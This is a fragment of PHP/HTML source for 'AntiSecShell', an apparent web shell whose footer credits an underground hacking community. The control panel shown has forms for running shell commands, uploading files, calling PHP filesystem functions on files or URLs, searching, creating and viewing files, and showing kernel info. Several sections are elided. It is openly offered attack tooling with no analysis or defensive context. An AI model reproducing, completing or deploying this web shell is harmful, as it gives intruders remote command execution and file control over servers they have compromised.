<tr><td align=right>C0mm4nd:</td>
<td><form method="POST">
    <input type=hidden name=antisec value="cmd">
...
<tr><td align=right>Qu1ck C0mm4nd5:</td>
<td><form method="POST">
    <input type=hidden name=antisec value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
...
?>
<tr><td align=right>K3rn3l 1nf0:</td>
...
<tr><td align=right>Upl04d:</td>
<td><form method="POST" enctype="multipart/form-data">
    <input type=hidden name=antisec value="upload">
...
<tr><td align=right>PHP F1l35y573m:</td>
<td><form name="fphpfsys" method="POST"><input type=hidden name=antisec value="phpfsys"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <select name="phpfsysfunc">
    <?php
    foreach ($pohpfsaliases as $als) {
      if ($als[1]==$pohpfsysfunc) { echo "<option selected value=\"".$als[1]."\">".$als[0]."</option>"; }
      else { echo "<option value=\"".$als[1]."\">".$als[0]."</option>";  }
    }
    ?>
    </select>
    F1l3/D1r/URL: <input type="text" name="arg1" id="a1" size="40" value="<?php echo htmlspecialchars($arg1); ?>">
    T0/M4x: <input type="text" name="arg2" size="50" value="<?php echo htmlspecialchars($arg2); ?>">
    <input type=submit name=submit value="Execute"><hr noshade size=1>
    <a href="#" onclick="set_arg('<?php echo $s_mu."ass.txt"; ?>','ass.php')">AntiSecShell</a>
    </form>
</td></tr>
<tr><td align=right>543rch:</td>
<td><form method="POST"><input type=hidden name=antisec value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>">
...
<tr><td align=right>M4k3 F1l3:</td>
<td><form method="POST"><input type=hidden name=antisec value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">
...
<td><form method="POST"><input type=hidden name=antisec value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> - <input type=submit value="View">
    </form></td></tr>
</table>
<br><div class=barheader2 colspan=2><font color=red>[--- AntiSecShell(ASS) by 7h3 und3rgr0und h4ck1ng c0mmuni7y | n0 c0n74c7s ju57 3nj0y 4nd pwn wh173h475 | G3n: <?php echo round(gmt()-starttime,4); ?> s3cs ---]
